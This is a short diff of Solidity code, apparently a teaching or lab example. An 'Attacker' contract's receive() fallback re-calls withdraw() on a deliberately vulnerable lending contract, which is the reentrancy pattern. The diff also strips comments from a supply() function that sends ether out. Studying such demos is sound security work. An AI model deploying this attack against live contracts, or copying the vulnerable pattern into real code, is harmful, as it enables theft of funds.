@@ -11,11 +11,6 @@ contract Attacker {
         me.supply(address(this), 100);
     }
 
-    // function tokensToSend() public {
-    //     // require(msg.sender == address(this), "Hook can only be called by the token");
-    //     me.withdraw(100);
-    // }
-
     receive () external payable {
         me.withdraw(100);
     }
@@ -34,13 +29,6 @@ contract Lendme
     function supply(address asset, uint amount) public returns (uint) {
 
         uint curBal = balances[asset];
-
-        /////////////////////////
-        // EFFECTS & INTERACTIONS
-        // (No safe failures beyond this point)
-
-        // We ERC-20 transfer the asset into the protocol (note: pre-conditions already checked above)
-        // transferFrom(asset, address(this), amount);
         msg.sender.transfer(amount);
 
         // Save user updates
